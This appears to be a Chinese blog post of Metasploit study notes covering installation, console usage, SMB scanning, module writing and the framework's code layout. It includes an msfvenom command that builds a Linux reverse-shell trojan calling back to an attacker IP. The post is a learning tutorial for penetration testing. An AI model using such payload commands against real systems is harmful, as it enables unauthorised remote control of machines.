---
layout: post
title: Metasploit
permalink: msf
---

Metasploit 将渗透测试的过程标准化自动化，每一步都有相应的代码对应，并提供了基础库，可以很方便的扩展。

它是一个渗透测试的集大成者，即是工具，有时学习的框架。

# 安装

- 使用 [kali Linux](https://www.kali.org/)
- 从[代码](https://github.com/rapid7/metasploit-framework)安装开发版。
- [安装社区版](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)。

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

之后就可以：

```bash
# 进入命令行
msfconsole
```

需要更新的话在 shell 里运行：

```bash
# 更新
msfupdate
```

## 配置
安装代码开发版的话，配置文件在 $HOME/.msf4 下，可以去设置数据库等。

### 数据库
配置好 database.yml 后，打开 msfconsole，它会自动创建数据库的。

如果显示 'Module database cache not built yet, using slow search'，则需要更新查找缓存：

```bash
msf > db_rebuild_cache
```

## 其它

- msfvenom 木马生成

```bash
# 生成一个木马程序
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.0.1 LPORT=443 -b "\x00" -f elf -o /tmp/evil/evil
```

# 基础

- target 待攻击目标
- exploit 利用漏洞，攻破目标的漏洞利用方式
- payload 有效载荷，一般是 shellcode，攻破目标后载入从而获得进一步控制


# 使用

msfconsole 主要使用步骤：

- scan 扫描目标
- search 找到合适的 exploit
- use 选择漏洞
- show options 查看需要设置的参数
- set 设置参数
  - PAYLOAD  攻击后执行的载荷
  - RHOST(S) 目标地址
  - THREADS
  - LHOST    攻击者的 IP
  - LPORT    攻击者的 端口
- exploit(run) 攻击

## 一个例子
进入命令行：

```bash
msfconsole
```


exploit 都存在 modules/exploits 目录里。

使用时，在命令行里：

```
msf > use  exploit/windows/smb/ms09_050_smb2_negotiate_func_index
msf exploit(ms09_050_smb2_negotiate_func_index) > help
...snip...
Exploit Commands
================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Launch an exploit attempt
    pry           Open a Pry session on the current module
    rcheck        Reloads the module and checks if the target is vulnerable
    reload        Just reloads the module
    rerun         Alias for rexploit
    rexploit      Reloads the module and launches an exploit attempt
    run           Alias for exploit

msf exploit(ms09_050_smb2_negotiate_func_index) >
```

- [一个简单的例子](https://www.offensive-security.com/metasploit-unleashed/shell/)
- [构造 deb 安装包来安装木马](https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/)

## Scan —— 扫描
Scanners and most other auxiliary modules use the RHOSTS option instead of RHOST. RHOSTS can take IP ranges (192.168.1.20-192.168.1.30), CIDR ranges (192.168.1.0/24), multiple ranges separated by commas (192.168.1.0/24, 192.168.3.0/24), and line separated host list files (file:/tmp/hostlist.txt). This is another use for our grepable Nmap output file.

Note also that, by default, all of the scanner modules will have the THREADS value set to ‘1’. The THREADS value sets the number of concurrent threads to use while scanning. Set this value to a higher number in order to speed up your scans or keep it lower in order to reduce network traffic but be sure to adhere to the following guidelines:

Keep the THREADS value under 16 on native Win32 systems
Keep THREADS under 200 when running MSF under Cygwin
On Unix-like operating systems, THREADS can be set to 256.

扫描 smb 版本：

```bash
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > set RHOSTS 192.168.1.200-210
RHOSTS => 192.168.1.200-210
msf auxiliary(smb_version) > set THREADS 11
THREADS => 11
msf auxiliary(smb_version) > run
```

## Search


# 编写自己的 exploit

做到极简隐秘等，并尽量利用已有的库：

-Capture – sniff network packets
-Lorcon – send raw WiFi frames
-MSSQL – talk to Microsoft SQL servers
-KernelMode – exploit kernel bugs
-SEH – structured exception handling
-NDMP – the network backup protocol
-EggHunter – memory search
-FTP – talk to FTP servers
-FTPServer – create FTP servers

只需要继承相应的类，重写 initialize 和 run、exploit 和 check 方法。

- initialize 编写相关信息和需要提供的参数等等
- check 判断是否存在当前的漏洞
- run 执行，默认绑定 exploit
- exploit 利用

并且 Metasploit 提供了很多好用的库，比如 TCP 网络链接的，编码的，模糊测试的等等。


# 代码分析

## 目录结构

```
data: editable files used by Metasploit
documentation: provides documentation for the framework
external: source code and third-party libraries
lib: the ‘meat’ of the framework code base
modules: the actual MSF modules
plugins: plugins that can be loaded at run-time
scripts: Meterpreter and other scripts
tools: various useful command-line utilities
```

modules 类型：

- auxiliary 没有 payload 的 exploit
- exploit 攻击
- payload
- post 攻击后的进一步操作，比如权限提升

## Libraries

The MSF libraries help us to run our exploits without having to write additional code for rudimentary tasks, such as HTTP requests or encoding of payloads.

### Rex

- The basic library for most tasks
- Handles sockets, protocols, text transformations, and others
- SSL, SMB, HTTP, XOR, Base64, Unicode

### Msf::Core

- Provides the ‘basic’ API
- Defines the Metasploit Framework

### Msf::Base

- Provides the ‘friendly’ API
- Provides simplified APIs for use in the Framework


# 参考
- https://www.offensive-security.com/metasploit-unleashed/
